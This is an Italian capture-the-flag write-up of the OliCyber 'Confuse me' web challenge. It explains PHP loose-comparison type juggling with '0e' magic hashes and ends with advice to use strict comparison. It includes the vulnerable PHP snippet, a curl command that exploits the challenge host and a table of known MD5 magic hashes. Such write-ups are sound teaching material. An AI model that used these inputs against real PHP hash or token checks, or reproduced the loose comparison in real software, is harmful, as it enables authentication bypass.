# Confuse me

**Competizione:** OliCyber<br>
**Categoria:** Web / PHP<br>
**URL:** http://confuse-me.challs.olicyber.it

---

## Descrizione

> Puoi provare a confondermi, ma, mi dispiace, non sei il tipo giusto per me.

Il hint è già tutto nel testo: **"non sei il tipo giusto"** → type juggling.

---

## Soluzione

### Step 1 — Analisi del sorgente

Accedendo a `?s` il sito espone il proprio codice PHP:

```php
if (isset($_GET['input'])) {
  $user_input = $_GET['input'];
  if ($user_input == substr(md5($user_input), 0, 24)) {
    echo "Ce l'hai fatta! Ecco la flag: $flag";
  } else {
    echo "Nope nope nope";
  }
}
```

La condizione da soddisfare è:

```
input == primi 24 caratteri di md5(input)
```

---

### Step 2 — Identificazione della vulnerabilità

PHP usa due operatori di confronto:

- `===` (strict): confronta valore **e tipo**
- `==` (loose): confronta solo il **valore**, con conversione automatica di tipo

Con la loose comparison (`==`), PHP esegue il **type juggling**: se entrambe le stringhe sembrano numeri, le converte in numeri prima di confrontarle.

In particolare, qualsiasi stringa che corrisponde al pattern `0e[0-9]+` viene interpretata da PHP come **notazione scientifica**: `0 × 10^n = 0.0`.

Quindi il confronto `"0e12345" == "0e99999"` è `true`, perché entrambe valgono `0` come float.

---

### Step 3 — Magic Hash

Esiste un input noto che soddisfa esattamente questa condizione:

```
input  = "0e215962017"
md5    = "0e291242476940776845150308577824"
```

- L'input inizia con `0e` seguito solo da cifre → PHP lo interpreta come `0`
- I primi 24 caratteri dell'md5 sono `0e291242476940776845150` → anch'essi `0e` + cifre → PHP li interpreta come `0`
- Il confronto diventa `0 == 0` → **`true`**

---

### Step 4 — Exploit

Con il comando `curl` è sufficiente:

```bash
curl -s "http://confuse-me.challs.olicyber.it/?input=0e215962017"
```

Per estrarre solo la flag:

```bash
curl -s "http://confuse-me.challs.olicyber.it/?input=0e215962017" \
  | grep -oP 'flag\{[^}]+\}'
```

**Output:**

```
flag{...}
```

---

## Conclusioni

La vulnerabilità sfruttata è il **PHP Loose Comparison Type Juggling**, combinato con i cosiddetti **Magic Hashes**: valori di input il cui hash MD5 ha la stessa forma `0e[0-9]+` dell'input stesso.

Quando PHP confronta queste stringhe con `==`, le interpreta entrambe come `0` in notazione scientifica, rendendo il confronto vero indipendentemente dai valori reali.

- Non usare mai `==` per confrontare stringhe in PHP quando uno dei valori proviene dall'utente
- Usare sempre `===` (strict comparison) che confronta tipo e valore senza conversioni implicite
- Questo vale in particolare per confronti su hash, token e password
- I Magic Hashes sono una lista nota di input che sfruttano esattamente questo comportamento

### Tabella Magic Hashes noti per MD5

| Input | MD5 |
|---|---|
| `0e215962017` | `0e291242476940776845150308577824` |
| `0e1137126905` | `0e291659922323405260514745084877` |
| `240610708` | `0e462097431906509019562988736854` |